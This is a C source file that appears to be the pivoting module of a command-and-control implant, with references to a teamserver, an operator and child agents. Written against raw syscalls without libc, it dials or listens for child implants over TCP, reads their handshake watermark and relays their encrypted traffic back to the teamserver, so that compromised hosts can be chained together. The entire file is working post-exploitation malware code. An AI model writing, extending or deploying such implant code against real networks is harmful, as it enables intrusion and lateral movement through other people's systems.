#include "pivot.h"
#include "crt.h"
#include "connector.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

// Linux socket constants (duplicated from connector.c — no shared header for these)
#ifndef AF_INET
#define AF_INET      2
#endif
#ifndef SOCK_STREAM
#define SOCK_STREAM  1
#endif
#ifndef IPPROTO_TCP
#define IPPROTO_TCP  6
#endif

// For non-blocking IO
#define F_GETFL  3
#define F_SETFL  4
#define O_NONBLOCK 04000

// For getsockopt SO_ERROR check after non-blocking connect
#define SOL_SOCKET   1
#define SO_ERROR     4

// EINPROGRESS for non-blocking connect
#define EINPROGRESS  115

// Connect timeout (PIVOT_CONNECT_TIMEOUT) is defined in pivot.h: main.c's
// reverse-pivot bootstrap dials with the same bound, so the value is shared.
// For pselect fd_set (up to 1024 fds)
typedef struct {
    unsigned long fds_bits[1024 / (8 * sizeof(unsigned long))];
} linux_fd_set;

#define FD_ZERO(set) ax_memset((set), 0, sizeof(linux_fd_set))
#define FD_SET(fd, set) ((set)->fds_bits[(fd) / (8 * sizeof(unsigned long))] |= (1UL << ((fd) % (8 * sizeof(unsigned long)))))
#define FD_ISSET(fd, set) ((set)->fds_bits[(fd) / (8 * sizeof(unsigned long))] & (1UL << ((fd) % (8 * sizeof(unsigned long)))))

// sockaddr_in (manual, no libc)
struct pivot_sockaddr_in {
    uint16_t sin_family;
    uint16_t sin_port;
    uint32_t sin_addr;
    uint8_t  sin_zero[8];
};

/// Global pivot context
pivot_context_t g_pivot_ctx;

void pivots_init(pivot_context_t *ctx) {
    ax_memset(ctx, 0, sizeof(pivot_context_t));
    /* 0 is a valid descriptor (stdin), so the "not listening" sentinel is -1. */
    ctx->listen_fd = -1;
}

/// Parse "host:port" into ip (network byte order) and port (host order)
static int pivot_parse_addr(const char *address, int port_override,
                            uint32_t *ip_out, uint16_t *port_out) {
    // If address contains ':', parse as "host:port"
    // Otherwise use address as host and port_override as port
    const char *host = address;
    int port = port_override;

    const char *colon = (const char *)0;
    for (const char *p = address; *p; p++) {
        if (*p == ':') colon = p;
    }

    // Parse IP octets from host part
    const char *end = colon ? colon : (address + ax_strlen(address));

    uint32_t octets[4] = {0};
    int idx = 0;
    for (const char *p = host; p < end && idx < 4; p++) {
        if (*p == '.') {
            idx++;
        } else if (*p >= '0' && *p <= '9') {
            octets[idx] = octets[idx] * 10 + (*p - '0');
        } else {
            return -1;
        }
    }
    if (idx != 3) return -1;
    for (int i = 0; i < 4; i++)
        if (octets[i] > 255) return -1;

    *ip_out = octets[0] | (octets[1] << 8) | (octets[2] << 16) | (octets[3] << 24);

    // Port: network byte order
    uint16_t p16 = (uint16_t)port;
    *port_out = ((p16 >> 8) & 0xFF) | ((p16 & 0xFF) << 8);

    return 0;
}

/// Read exactly N bytes from fd. Returns 0 on success, -1 on failure.
static int pivot_read_exact(int fd, uint8_t *buf, size_t size) {
    size_t total = 0;
    while (total < size) {
        long n = sys_read(fd, buf + total, size - total);
        if (n <= 0) return -1;
        total += (size_t)n;
    }
    return 0;
}

/// Write exactly N bytes to fd. Returns 0 on success, -1 on failure.
static int pivot_write_exact(int fd, const uint8_t *buf, size_t size) {
    size_t total = 0;
    while (total < size) {
        long n = sys_write(fd, buf + total, size - total);
        if (n <= 0) return -1;
        total += (size_t)n;
    }
    return 0;
}

/// Read a length-prefixed message from child: [4B BE length][payload]
/// Returns payload (caller frees) and sets *out_len. Returns NULL on failure.
static uint8_t *pivot_recv_msg(int fd, uint32_t *out_len) {
    uint8_t hdr[4];
    if (pivot_read_exact(fd, hdr, 4) != 0) return (uint8_t *)0;

    uint32_t msg_len = ((uint32_t)hdr[0] << 24) | ((uint32_t)hdr[1] << 16) |
                       ((uint32_t)hdr[2] << 8) | hdr[3];
    if (msg_len == 0 || msg_len > 64 * 1024 * 1024) return (uint8_t *)0;

    uint8_t *buf = (uint8_t *)ax_malloc(msg_len);
    if (!buf) return (uint8_t *)0;

    if (pivot_read_exact(fd, buf, msg_len) != 0) {
        ax_free(buf);
        return (uint8_t *)0;
    }

    *out_len = msg_len;
    return buf;
}

/// Send a length-prefixed message to child: [4B BE length][payload]
static int pivot_send_msg(int fd, const uint8_t *data, uint32_t data_len) {
    uint8_t hdr[4] = {
        (uint8_t)(data_len >> 24), (uint8_t)(data_len >> 16),
        (uint8_t)(data_len >> 8),  (uint8_t)data_len
    };
    if (pivot_write_exact(fd, hdr, 4) != 0) return -1;
    if (pivot_write_exact(fd, data, data_len) != 0) return -1;
    return 0;
}

// ── Link TCP ──

/// Dial a TCP peer with a bounded connect timeout.
///
/// Returns a *blocking* connected fd on success, -1 on failure.  On failure
/// *err_out (when non-NULL) is pointed at a static reason string so callers
/// can keep reporting the same messages they always did.
///
/// Shared by the forward pivot (parent dials the child) and the reverse
/// pivot's child-side bootstrap (child dials the parent) -- it is the same
/// non-blocking connect + pselect6 + SO_ERROR dance, implemented once.
int pivot_dial_tcp(const char *address, int port, int timeout_s, const char **err_out) {
    uint32_t ip;
    uint16_t net_port;
    if (pivot_parse_addr(address, port, &ip, &net_port) != 0) {
        if (err_out) *err_out = "Invalid address";
        return -1;
    }

    int fd = (int)sys_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (fd < 0) {
        if (err_out) *err_out = "Socket creation failed";
        return -1;
    }

    struct pivot_sockaddr_in addr;
    ax_memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = net_port;
    addr.sin_addr = ip;

    // Set non-blocking for connect timeout
    long orig_flags = sys_fcntl(fd, F_GETFL, 0);
    sys_fcntl(fd, F_SETFL, orig_flags | O_NONBLOCK);

    int conn_ret = sys_connect(fd, &addr, sizeof(addr));
    if (conn_ret != 0 && conn_ret != -EINPROGRESS) {
        sys_close(fd);
        if (err_out) *err_out = "Connection refused";
        return -1;
    }

    if (conn_ret == -EINPROGRESS) {
        // Wait for connection with timeout using pselect6
        linux_fd_set writefds;
        FD_ZERO(&writefds);
        FD_SET(fd, &writefds);

        struct linux_timespec conn_timeout = { .tv_sec = timeout_s, .tv_nsec = 0 };
        int ready = sys_pselect6(fd + 1, (void *)0, &writefds, (void *)0, &conn_timeout, (void *)0);

        if (ready <= 0) {
            sys_close(fd);
            if (err_out) *err_out = "Connection timed out";
            return -1;
        }

        // Check SO_ERROR to verify connection succeeded
        int sock_err = 0;
        unsigned int err_len = sizeof(sock_err);
        sys_getsockopt(fd, SOL_SOCKET, SO_ERROR, &sock_err, &err_len);
        if (sock_err != 0) {
            sys_close(fd);
            if (err_out) *err_out = "Connection refused";
            return -1;
        }
    }

    // Restore blocking mode for subsequent read/write
    sys_fcntl(fd, F_SETFL, orig_flags);
    return fd;
}

/// Adopt an already-connected child socket as a pivot entry.
///
/// Shared by both directions: pivot_link_tcp() hands it a fd it dialed, the
/// reverse/listen path hands it a fd it accepted.  The child speaks first in
/// both cases, so the handshake read is identical.
///
/// pivot_id == 0 means "derive it from the child's watermark" -- a reverse
/// pivot has no originating task id, and both sides compute the id the same
/// way (the teamserver takes it from AnsLink.Watermark).
///
/// On success returns 0 and stores the pivot id in *out_id (when non-NULL).
/// On failure the fd is closed, an error is written to `response`, and -1 is
/// returned.
static int pivot_adopt_fd(pivot_context_t *ctx, int slot, uint32_t pivot_id,
                          int fd, mp_writer_t *response, uint32_t *out_id) {
    // The child sends its init message as [4B BE length][encrypted_data].
    // The encrypted_data contains the watermark (first 4 bytes) + beat.
    uint32_t beat_len = 0;
    uint8_t *beat_data = pivot_recv_msg(fd, &beat_len);
    if (!beat_data || beat_len < 4) {
        if (beat_data) ax_free(beat_data);
        sys_close(fd);
        mp_write_map(response, 1);
        mp_write_kv_str(response, "error", "Handshake failed");
        return -1;
    }

    uint32_t watermark = ((uint32_t)beat_data[0] << 24) | ((uint32_t)beat_data[1] << 16) |
                         ((uint32_t)beat_data[2] << 8) | beat_data[3];
    if (pivot_id == 0) pivot_id = watermark;

    ctx->entries[slot].id = pivot_id;
    ctx->entries[slot].fd = fd;
    ctx->entries[slot].active = 1;
    ctx->count++;

    // Response: {type: PIVOT_TYPE_TCP, watermark: uint32, beat: bytes}
    mp_write_map(response, 3);
    mp_write_kv_uint(response, "type", PIVOT_TYPE_TCP);
    mp_write_kv_uint(response, "watermark", watermark);
    mp_write_kv_bin(response, "beat", beat_data + 4, beat_len - 4);

    ax_free(beat_data);
    if (out_id) *out_id = pivot_id;
    return 0;
}

int pivot_link_tcp(pivot_context_t *ctx, uint32_t task_id,
                   const char *address, int port,
                   mp_writer_t *response) {
    // Find free slot
    int slot = -1;
    for (int i = 0; i < MAX_PIVOTS; i++) {
        if (!ctx->entries[i].active) {
            slot = i;
            break;
        }
    }
    if (slot < 0) {
        mp_write_map(response, 1);
        mp_write_kv_str(response, "error", "Max pivots reached");
        return -1;
    }

    const char *dial_err = (const char *)0;
    int fd = pivot_dial_tcp(address, port, PIVOT_CONNECT_TIMEOUT, &dial_err);
    if (fd < 0) {
        mp_write_map(response, 1);
        mp_write_kv_str(response, "error", dial_err ? dial_err : "Connection failed");
        return -1;
    }

    // Read the child's handshake and register the pivot.  Shared verbatim
    // with the reverse/listen path (pivot_adopt_fd).
    return pivot_adopt_fd(ctx, slot, task_id, fd, response, (uint32_t *)0);
}

// ── Unlink ──

int pivot_unlink(pivot_context_t *ctx, uint32_t pivot_id,
                 mp_writer_t *response) {
    for (int i = 0; i < MAX_PIVOTS; i++) {
        if (ctx->entries[i].active && ctx->entries[i].id == pivot_id) {
            sys_close(ctx->entries[i].fd);
            ctx->entries[i].active = 0;
            ctx->entries[i].fd = -1;
            ctx->count--;

            mp_write_map(response, 2);
            mp_write_kv_uint(response, "pivot_id", pivot_id);
            mp_write_kv_uint(response, "type", PIVOT_TYPE_TCP);
            return 0;
        }
    }

    mp_write_map(response, 2);
    mp_write_kv_uint(response, "pivot_id", pivot_id);
    mp_write_kv_uint(response, "type", 0);
    return -1;
}

// ── Write to pivot (relay from teamserver to child) ──

int pivot_write(pivot_context_t *ctx, uint32_t pivot_id,
                const uint8_t *data, uint32_t data_len) {
    if (!data || data_len == 0) return -1;

    for (int i = 0; i < MAX_PIVOTS; i++) {
        if (ctx->entries[i].active && ctx->entries[i].id == pivot_id) {
            return pivot_send_msg(ctx->entries[i].fd, data, data_len);
        }
    }
    return -1;
}

// ── Reverse pivot: listen side ──

int pivot_listen_tcp(pivot_context_t *ctx, int port, mp_writer_t *response) {
    // port == 0 -> stop listening (lets the operator close the window again)
    if (port <= 0) {
        if (ctx->listen_fd >= 0) {
            sys_close(ctx->listen_fd);
            ctx->listen_fd = -1;
            ctx->listen_port = 0;
        }
        mp_write_map(response, 2);
        mp_write_kv_str(response, "status", "stopped");
        mp_write_kv_uint(response, "port", 0);
        return 0;
    }

    // Re-listening replaces the previous listener (idempotent).
    if (ctx->listen_fd >= 0) {
        sys_close(ctx->listen_fd);
        ctx->listen_fd = -1;
    }

    connector_t server;
    if (conn_bind_listen(&server, (uint16_t)port) != 0) {
        mp_write_map(response, 1);
        mp_write_kv_str(response, "error", "Listen failed");
        return -1;
    }

    // Non-blocking: process_pivots() polls it, so the agent's command loop is
    // never stalled waiting for a child that may never dial in.
    long flags = sys_fcntl(server.fd, F_GETFL, 0);
    if (flags >= 0) sys_fcntl(server.fd, F_SETFL, flags | O_NONBLOCK);

    ctx->listen_fd = server.fd;
    ctx->listen_port = (uint16_t)port;

    mp_write_map(response, 2);
    mp_write_kv_str(response, "status", "listening");
    mp_write_kv_uint(response, "port", (uint64_t)port);
    return 0;
}

/// Poll the listener and adopt one child that dialed in.
///
/// The announcement is emitted as an asynchronous COMMAND_LINK object with
/// id: 0 -- the same convention the auto-disconnect COMMAND_UNLINK below uses,
/// so the teamserver reads the pivot id out of the payload (the child's
/// watermark) instead of a task id, and reuses its existing COMMAND_LINK
/// handler verbatim.
///
/// Returns the number of objects appended (0 or 1).
static int pivot_accept_pending(pivot_context_t *ctx, mp_writer_t *objects_writer) {
    if (ctx->listen_fd < 0) return 0;

    linux_fd_set readfds;
    FD_ZERO(&readfds);
    FD_SET(ctx->listen_fd, &readfds);

    struct linux_timespec timeout = { .tv_sec = 0, .tv_nsec = 0 };
    int ready = sys_pselect6(ctx->listen_fd + 1, &readfds, (void *)0, (void *)0, &timeout, (void *)0);
    if (ready <= 0 || !FD_ISSET(ctx->listen_fd, &readfds)) return 0;

    connector_t server;
    ax_memset(&server, 0, sizeof(server));
    server.fd = ctx->listen_fd;

    connector_t conn;
    if (conn_accept(&conn, &server) != 0) return 0;   // spurious wakeup

    int slot = -1;
    for (int i = 0; i < MAX_PIVOTS; i++) {
        if (!ctx->entries[i].active) { slot = i; break; }
    }
    if (slot < 0) {
        conn_close(&conn);
        return 0;
    }

    mp_writer_t rsp;
    mp_writer_init(&rsp, 128);
    uint32_t pivot_id = 0;
    if (pivot_adopt_fd(ctx, slot, 0, conn.fd, &rsp, &pivot_id) != 0) {
        mp_writer_free(&rsp);   // pivot_adopt_fd already closed the socket
        return 0;
    }

    mp_writer_t cmd;
    mp_writer_init(&cmd, 128);
    mp_write_map(&cmd, 3);
    mp_write_kv_uint(&cmd, "code", COMMAND_LINK);
    mp_write_kv_uint(&cmd, "id", 0);
    mp_write_kv_bin(&cmd, "data", rsp.buf.data, (uint32_t)rsp.buf.len);
    mp_write_bin(objects_writer, cmd.buf.data, (uint32_t)cmd.buf.len);
    mp_writer_free(&cmd);
    mp_writer_free(&rsp);
    return 1;
}

// ── Process pivots (poll child sockets for incoming data) ──

int process_pivots(pivot_context_t *ctx, mp_writer_t *objects_writer) {
    // NB: an open listener counts even with no pivots yet -- that is exactly
    // the state we sit in while waiting for the first child to dial in.
    if (ctx->count == 0 && ctx->listen_fd < 0) return 0;

    int appended = 0;
    appended += pivot_accept_pending(ctx, objects_writer);

    for (int i = 0; i < MAX_PIVOTS; i++) {
        if (!ctx->entries[i].active) continue;

        int fd = ctx->entries[i].fd;

        // Non-blocking check: use pselect6 with zero timeout
        linux_fd_set readfds;
        FD_ZERO(&readfds);
        FD_SET(fd, &readfds);

        struct linux_timespec timeout = { .tv_sec = 0, .tv_nsec = 0 };
        int ready = sys_pselect6(fd + 1, &readfds, (void *)0, (void *)0, &timeout, (void *)0);

        if (ready > 0 && FD_ISSET(fd, &readfds)) {
            // Data available — try to read a length-prefixed message
            uint32_t msg_len = 0;
            uint8_t *msg_data = pivot_recv_msg(fd, &msg_len);

            if (msg_data && msg_len > 0) {
                // Build a Command{code: PIVOT_EXEC, id: 0, data: {pivot_id, data}}
                mp_writer_t inner;
                mp_writer_init(&inner, 64);
                mp_write_map(&inner, 2);
                mp_write_kv_uint(&inner, "pivot_id", ctx->entries[i].id);
                mp_write_kv_bin(&inner, "data", msg_data, msg_len);

                mp_writer_t cmd;
                mp_writer_init(&cmd, 128);
                mp_write_map(&cmd, 3);
                mp_write_kv_uint(&cmd, "code", COMMAND_PIVOT_EXEC);
                mp_write_kv_uint(&cmd, "id", 0);
                mp_write_kv_bin(&cmd, "data", inner.buf.data, (uint32_t)inner.buf.len);

                // Append to the objects array
                mp_write_bin(objects_writer, cmd.buf.data, (uint32_t)cmd.buf.len);

                mp_writer_free(&inner);
                mp_writer_free(&cmd);
                ax_free(msg_data);
                appended++;
            } else {
                // Connection lost — auto-disconnect
                sys_close(fd);

                // Build unlink notification
                mp_writer_t inner;
                mp_writer_init(&inner, 32);
                mp_write_map(&inner, 2);
                mp_write_kv_uint(&inner, "pivot_id", ctx->entries[i].id);
                mp_write_kv_uint(&inner, "type", PIVOT_TYPE_DISCONNECT);

                mp_writer_t cmd;
                mp_writer_init(&cmd, 64);
                mp_write_map(&cmd, 3);
                mp_write_kv_uint(&cmd, "code", COMMAND_UNLINK);
                mp_write_kv_uint(&cmd, "id", 0);
                mp_write_kv_bin(&cmd, "data", inner.buf.data, (uint32_t)inner.buf.len);

                mp_write_bin(objects_writer, cmd.buf.data, (uint32_t)cmd.buf.len);

                mp_writer_free(&inner);
                mp_writer_free(&cmd);

                ctx->entries[i].active = 0;
                ctx->entries[i].fd = -1;
                ctx->count--;
                appended++;
            }
        }
    }

    return appended;
}
